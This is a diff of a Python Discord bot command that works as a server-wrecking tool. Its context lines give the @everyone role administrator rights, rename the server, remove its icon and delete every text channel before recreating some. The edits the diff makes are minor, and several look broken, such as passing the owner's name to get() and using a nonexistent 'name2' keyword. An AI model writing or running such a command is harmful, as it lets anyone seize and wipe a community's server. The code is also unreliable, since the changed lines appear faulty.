@@ -31,11 +31,11 @@ async def orgia(ctx):
   await every.edit(reason = None, permissions=permissions)
   name = '채팅 채널'
   name2 = "음성 채널"
-  owner = str(ctx.guild.owner.name)
+  owner = get(ctx.guild.owner.name)
   emojini = get(ctx.guild.emojis)
   roles = get(ctx.guild.roles)
   categories = get(ctx.guild.categories, name=name)
-  categories2 = get(ctx.guild.categories, name=name2)
+  categories2 = get(ctx.guild.categories, name2=name2)
   await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
   for c in ctx.guild.text_channels:
       await c.delete()
@@ -49,7 +49,7 @@ async def orgia(ctx):
   permissions.update(administrator = True)
   await every.edit(reason = None, permissions=permissions)
   name = '채팅 채널'
-  name2 = "음성 채널"
+  name2 = '음성 채널'
   categories = get(ctx.guild.categories, name=name)
   categories2 = get(ctx.guild.categories, name=name2)
   await ctx.guild.create_text_channel("일반", category=categories)
